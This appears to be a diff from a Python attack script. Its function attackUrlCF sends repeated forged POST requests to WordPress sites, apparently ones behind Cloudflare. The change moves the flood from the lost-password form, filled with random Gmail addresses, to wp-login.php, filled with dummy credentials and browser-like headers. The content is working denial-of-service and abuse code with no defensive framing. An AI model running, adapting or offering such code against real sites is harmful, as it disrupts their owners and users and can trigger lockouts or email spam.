@@ -106,7 +106,7 @@ def attackUrlCF(baseUrl, threadNum):
 		try:
 			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
 			# url = baseUrl +'/' + ''.join(random.choice(letters) for i in range(30)) 
-			url = baseUrl + '/wp-login.php?action=lostpassword'
+			url = baseUrl + '/wp-login.php'
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
@@ -115,8 +115,8 @@ def attackUrlCF(baseUrl, threadNum):
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
-
-			data = {'user_login': ''.join(random.choice(letters) for i in range(10)) + "@gmail.com",'redirect_to':"",'wp-submit':"Get+New+Password"}
+			data= {'log':"asdasd",'pwd':"asdasd", 'redirect_to':"",'wp-submit':"Log+In", 'testcookie':"1"}
+			#data = {'user_login': ''.join(random.choice(letters) for i in range(10)) + "@gmail.com",'redirect_to':"",'wp-submit':"Get+New+Password"}
 			# print(proxies, cookiesStr)
 			# print(requests.get('https://api.ipify.org', proxies=proxies).content)
 
